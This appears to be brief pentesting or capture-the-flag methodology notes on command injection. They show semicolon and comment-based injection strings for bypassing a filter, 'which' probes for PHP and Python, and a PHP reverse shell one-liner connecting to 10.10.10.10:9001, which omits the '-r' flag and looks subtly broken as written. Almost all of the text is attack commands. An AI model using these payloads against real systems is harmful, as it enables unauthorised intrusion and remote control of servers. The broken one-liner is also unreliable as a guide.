Methodology

Try to emulate the command if you know what it is in your terminal and see which of the tricks work and HOW it interacts with it

If you cant chain once, try twice 


```
;ls -la; asd
```

once you are able to bypass the filter try to use reverse shell. this can be done by using `which` and seeing what applications are available

```
;which php; test
;which python; test
```

```
; /usr/local/bin/php '$sock=fsockopen("10.10.10.10",9001);exec("sh <&3 >&3 2>&3");'
```

the reason for using `/usr/local/bin/php` is because there is no guarantee that this is in the path and call be just called, so its best to always hard call things


```
;ls -la #
```
